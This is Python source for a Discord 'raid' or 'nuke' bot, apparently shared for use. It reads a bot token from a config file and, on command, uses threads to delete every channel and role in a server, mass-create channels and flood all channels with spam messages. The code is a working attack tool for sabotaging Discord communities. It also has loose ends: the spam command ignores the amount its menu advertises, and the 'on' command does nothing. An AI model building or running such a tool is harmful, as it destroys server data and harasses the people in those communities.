import os
import logging
import sys
import json
import discord
from discord.ext import commands
import requests
import threading
from pystyle import Colors, Colorate

os.system("")

def load_config():
    global token, prefix, channel_names, role_names, message_content

    current_directory = os.path.abspath(os.getcwd())
    file_path = os.path.join(current_directory,'utilities', 'other', 'simplebotraid', 'config_bot.json')
    print(current_directory)
    try:
        with open(file_path, 'r') as archive:
            configbot = json.load(archive)
            token = configbot["token"]
            prefix = configbot["prefix"]
            channel_names = configbot.get("channel_names")
            role_names = configbot.get("role_names")
            message_content = configbot.get("message_content")
    except Exception as e:
        print(f"Ocurrió un error: {e}")         

load_config()

modules = ["discord", "discord.py", "requests", "pystyle"]
try:
    import discord
    import requests
    from pystyle import Colors, Colorate
except ImportError:
    print(Colorate.Horizontal(Colors.purple_to_blue, " [!] Checking if you have the modules installed. . .", 1, 0))
    for libraries in modules:
        os.system(f"pip install {libraries}")

from os import _exit
from time import sleep
import discord
from discord.ext import commands
import requests
import threading
import base64
import random
import json

os.system("cls")


load_config() 
headers = {
            "Authorization": f"Bot {token}"
        }

if sys.platform == "win32":
         clear = lambda: os.system("cls")
else:
         clear = lambda: os.system("clear")

logging.basicConfig(
         level=logging.INFO,
         format= "\033[0;49;35m[\033[1;30;48m%(asctime)s\033[0;49;35m] \033[0m%(message)s",
         datefmt="%H:%M:%S",
        )

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help") 

sessions = requests.Session()        

def menu():
        clear()
        logging.info(
        f"""\033[0;49;35m
                                                                                   
                              
                              (      (    )  (          )  
                              )\ )   )\( /(( )\      ( /(  
                            (()/(  ((_)\())((_)  (  )\()) 
                             /(_))_ _((_)((_)_   )\(_))/  
                            (_)) __| | |(_) _ ) ((_) |_   
                              | (_ | | / /| _ \/ _ \  _|  
                               \___|_|_\_\|___/\___/\__|  
                  
                              {prefix}on - Automatic mode
                              {prefix}nuke - Delete all channels, roles
                              {prefix}spam <amount> - Spam in all channels
                              {prefix}ccr <amount> - Create Channels

      \n\n"""
       )
        logging.info(f"\033[1;37;0mClient: {bot.user}")
        logging.info(f"\033[1;37;0mPrefix: {prefix}")
        logging.info(f"\033[1;37;0m.gg/glk ")   

@bot.event
async def on_ready():
    try:
         await bot.change_presence(status=discord.Status.online)
    except Exception:
           pass
    menu()

@bot.event
async def on_message(message):                    
        await bot.process_commands(message)

@bot.command(
      aliases=["start", "empezar"]
      )
async def on(ctx):
       try:
        await ctx.message.delete()
        guild = ctx.guild.id
       except:
        logging.info(f"Connection error.")
        sleep(10)
        _exit(0)

def channel_deleter(channel_id):
       try:
        requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
       except:
        pass

def role_deleter(guild_id, role_id):
       try:
        requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
       except:
         pass

def channel_creater(guild_id):
       payload = {
         "name": channel_names,
         "permission_overwrites": [],
         "type": 0
        }
       try:
         requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=payload)
       except:
         pass

def role_creater(guild_id):
       payload = {
        "name": role_names,
        "color": random.randint(0, 0xffffff)
       }
       try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json=payload)
       except:
        pass

def messages_spam(channel_id):
       payload = {
        "content": message_content,
        "tts": False
       }
       try:
        requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
       except:
         pass

@bot.command()
async def nuke(ctx):
       await ctx.message.delete()

       for channel in ctx.guild.channels:
        threading.Thread(target=channel_deleter, args=(channel.id,)).start()

       for role in ctx.guild.roles:
        threading.Thread(target=role_deleter, args=(ctx.guild.id, role.id,)).start()

@bot.command()
async def ccr(ctx, amount: int):
       await ctx.message.delete()

       for i in range(amount):
        threading.Thread(target=channel_creater, args=(ctx.guild.id,)).start()

@bot.command()
async def spam(ctx):
     await ctx.message.delete()

     for i in range(30):
        for channel in ctx.guild.channels:
            threading.Thread(target=messages_spam, args=(channel.id,)).start()    


bot.run(token)